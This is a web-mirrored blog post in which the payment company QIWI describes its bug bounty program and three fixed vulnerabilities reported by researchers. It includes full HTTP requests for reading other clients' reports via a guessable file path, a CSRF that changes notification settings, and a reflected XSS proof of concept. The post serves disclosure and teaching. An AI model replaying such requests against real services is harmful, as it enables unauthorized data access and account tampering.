<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>3 stories of Ethic Hack. How hackers help QIWI eliminate bugs</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Not so long ago we launched one interesting program in QIWI - it is called Ethic Hack . In fact, we attract everyone to search for errors and bugs in ...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>3 stories of Ethic Hack. How hackers help QIWI eliminate bugs</h1><div class="post__text post__text-html js-mediator-article">  Not so long ago we launched one interesting program in QIWI - <a href="https://www.qiwi.ru/page/hack.action">it is called Ethic Hack</a> .  In fact, we attract everyone to search for errors and bugs in the system interfaces.  Found a bug, described it in a letter, received a reward from QIWI - this is how the scheme works.  When the program was launched, the office was divided into 2 camps: some believed in success and the possibility of assistance from hackers, while others were skeptical about this venture.  Then it was difficult to judge objectively - we had nothing but probable predictions.  And now - there is.  And we just want to share with you the accumulated cases. <br><br><img src="https://habrastorage.org/storage2/ac2/6e2/303/ac26e23037f067f67510811eaabc212d.png"><br><br>  Since the launch of the program, we have received information and fixed more than 150 vulnerabilities.  We paid up to 150,000 rubles for certain vulnerabilities, but we cannot publish them in the examples. 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
      So, the program went uphill.  We have accumulated a lot of bugs, which we have fixed thanks to the assistance of hackers.  Especially for you, we have highlighted several examples.  Some real ethic hack stories. <a name="habracut"></a><br><br><h4>  Story One: read other people's reports. </h4><br><br>  Vulnerable host: sms.qiwi.ru <br>  Vulnerability type: Directory bypass + weak ID check + no session check <br>  What allows: To read other people's reports and get a crowd of company clients and their actions :) <br><br>  Where exactly: sms. after Reports (123456 -&gt; reports / 12/34 / 56.dat).  Voila, you have someone else's report :) <br><br>  Full GET request with an example of stealing someone else's report: <br><br>  GET /bo/monitor/get_excel_format.jsp?html_file_name=reports/13/41/14.dat&amp;report_name=report7&amp;file_name=report7.xls&amp;report_instance_id= HTTP / 1.1 <br>  Host: sms.qiwi.ru <br>  User-Agent: Mozilla / 5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit / 536.28.10 (KHTML, like Gecko) Version / 6.0.3 Safari / 536.28.10 <br>  Accept: text / html, application / xhtml + xml, application / xml; q = 0.9, * / *; q = 0.8 <br>  Origin: <a href="https://sms.qiwi.ru/">sms.qiwi.ru</a> <br>  Accept-Encoding: gzip, deflate <br>  Accept-Language: ru <br>  Referer: <a href="https://sms.qiwi.ru/bo/monitor/report_view.jsp%3Finstance_id%3D144114">sms.qiwi.ru/bo/monitor/report_view.jsp?instance_id=144114</a> <br>  Cookie: JSESSIONID =;  __utma = 200106670.88940096.1367226876.1367244987.1367247574.7;  __utmc = 200106670;  __utmz = 200106670.1367247574.7.5.utmcsr = google | utmccn = (organic) | utmcmd = organic | utmctr = site% 3Aqiwi.ru% 20inurl% Connection: keep-alive <br>  Proxy-Connection: keep-alive <br><br><h4>  The second story: how was it possible to change the parameters of notifications. </h4><br><br>  Vulnerable Host <br>  ishop.qiwi.ru <br><br>  Type of vulnerability in the framework of the classification OWASP TOP 10 <br>  A8 - CSRF <br><br>  Where exactly <br>  <a href="https://ishop.qiwi.ru/notificationSave.action">ishop.qiwi.ru/notificationSave.action</a> <br><br>  What allow <br>  The vulnerability allows an attacker to change the notification settings (phone number, sms, etc.) of a user when this user navigates to a page specially created by the attacker. <br><br>  How to repeat <br>  1. Log in to the system under some user account. <br>  2. Make settings for notifications. <br>  3. Perform step 4 (test) <br>  4. Send the following request using BurpSuite or its equivalent, substituting the received session cookie values ‚Äã‚Äã(JSESSIONID) <br><br>  POST /notificationSave.action HTTP / 1.1 <br>  Host: ishop.qiwi.ru <br>  User-Agent: Mozilla / 5.0 (Windows NT 6.1; WOW64; rv: 20.0) Gecko / 20100101 Firefox / 20.0 <br>  Accept: text / html, application / xhtml + xml, application / xml; q = 0.9, * / *; q = 0.8 <br>  Accept-Language: ru-RU, ru; q = 0.8, en-US; q = 0.5, en; q = 0.3 <br>  Accept-Encoding: gzip, deflate <br>  Referer: <a href="https://ishop.qiwi.ru/notifications.action">ishop.qiwi.ru/notifications.action</a> <br>  Cookie: __utma = 200106670.867508279.1368788962.1368788962.1369037765.2;  __utmz = 200106670.1368788962.1.1.utmcsr = (direct) | utmccn = (direct) | utmcmd = (none);  __utmc = 200106670;  JSESSIONID = ;. node-ishop04.1;  __utma = 47471167.1903908478.1369624211.1369650501.1369717004.6;  __utmc = 47471167;  __utmz = 47471167.1369717004.6.2.utmcsr = ishopnew.qiwi.ru | utmccn = (referral) | utmcmd = referral | utmcct = /;  __utmb = 47471167.25.10.1369717004 <br>  Connection: keep-alive <br>  Content-Type: application / x-www-form-urlencoded <br>  Content-Length: 244 <br><br>  phone = &amp; incomingBillMail = true &amp; __ checkbox_incomingBillMail = true &amp; __ checkbox_outgoingBillMail = true &amp; __ checkbox_incomingPayMail = true &amp; __ checkbox_incomingPaySMS = true &amp; __ checkbox_cancelPayMail = true &amp; __ checkbox_cancelPaySMS = true <br>  5. Go to the notification settings page, make sure that the phone number and notification settings have been changed <br><br>  Recommendations for elimination <br>  Add a hidden form field containing a random value - a CSRF token. <br>  <a href="https://www.owasp.org/index.php/Cross-Site_Request_Forgery_%2528CSRF%2529_Prevention_Cheat_Sheet">www.owasp.org/index.php/Cross-Site_Request_Forgery_%28CSRF%29_Prevention_Cheat_Sheet</a> <br><br><h4>  Third story: arbitrary code. </h4><br><br>  Error found on the site <a href="https://w.qiwi.ru/">w.qiwi.ru.</a> <br><br>  There is no any validation and screening of the output for the callback parameter in the /user/communication/sendsms.action script. <br><br>  It is possible to execute arbitrary code on the client side. <br><br>  To conduct an attack, user registration in the system is not required.  The user must open the javascript script suggested by the browser. <br><br>  Request example <br><br>  GET /user/communication/sendsms.action?number=&amp;text=111&amp;callback = &lt;&gt; "'; HTTP / 1.1 <br>  Host: w.qiwi.ru <br>  User-Agent: Mozilla / 5.0 (Windows NT 6.1; WOW64; rv: 20.0) Gecko / 20100101 Firefox / 20.0 <br>  Accept: text / javascript, application / javascript, * / * <br>  Accept-Language: ru-RU, ru; q = 0.8, en-US; q = 0.5, en; q = 0.3 <br>  Accept-Encoding: gzip, deflate <br>  X-Requested-With: XMLHttpRequest <br>  Referer: <a href="https://w.qiwi.ru/communication.action">w.qiwi.ru/communication.action</a> <br>  Cookie: __utma = 153665022.317299647.1368525797.1368679677.1368684655.3;  __utmz = 153665022.1368684655.3.3.utmcsr = google | utmccn = (organic) | utmcmd = organic | utmctr = qiwi% 20webmoney;  JSESSIONID = .node-wb02.2;  __utmc = 153665022;  __utmb = 153665022.34.10.1368684655 <br>  Connection: keep-alive <br>  Content-Length: 6 <br><br>  Answer <br><br>  HTTP / 1.1 200 OK <br>  Date: Thu, 16 May 2013 08:16:14 GMT <br>  Expires: Sat, 6 May 1995 12:00:00 GMT <br>  Cache-Control: no-store, no-cache, must-revalidate <br>  Cache-Control: post-check = 0, pre-check = 0 <br>  Pragma: no-cache <br>  Content-Type: text / javascript; charset = utf-8 <br>  Content-Length: 142 <br>  Keep-Alive: timeout = 5, max = 100 <br>  Connection: Keep-Alive <br><br>  &lt;&gt; "'; ({error: 0, data: {" confirmedBySms ": true," confirmLink ":" "," provider ":" 199 "," identifier ":" "}, messages: [], errors: [], fieldErrors: []}) <br><br>  Proof of concept <br><br>  In Internet Explorer browser go to <br><br>  <a href="https://w.qiwi.ru/user/communication/sendsms.action%3Fnumber%3D">w.qiwi.ru/user/communication/sendsms.action?number=</a> text = 111 &amp; callback = WScript.Echo ('XSS'); <br>  When checking the browser used Internet Explorer version 9. </div><p>Source: <a href="https://habr.com/ru/post/187724/">https://habr.com/ru/post/187724/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../187706/index.html">Meet Tizen</a></li>
<li><a href="../187708/index.html">Unusual site navigation</a></li>
<li><a href="../187716/index.html">Yandex Islands Beta: "We want to give meaning to any element on the search results page"</a></li>
<li><a href="../187720/index.html">Raytracing render on C</a></li>
<li><a href="../187722/index.html">L-series 2013: what LG state employees are capable of</a></li>
<li><a href="../187728/index.html">Your programming level and not only</a></li>
<li><a href="../187734/index.html">Review of the smartphone Lenovo P780</a></li>
<li><a href="../187738/index.html">Create products that do not scale.</a></li>
<li><a href="../187740/index.html">Runetology (204): Dmitry Yakovlev, Acting CEO Ozon.Travel</a></li>
<li><a href="../187742/index.html">Course lectures "Startup". Peter Thiel. Stanford 2012. Session 17</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>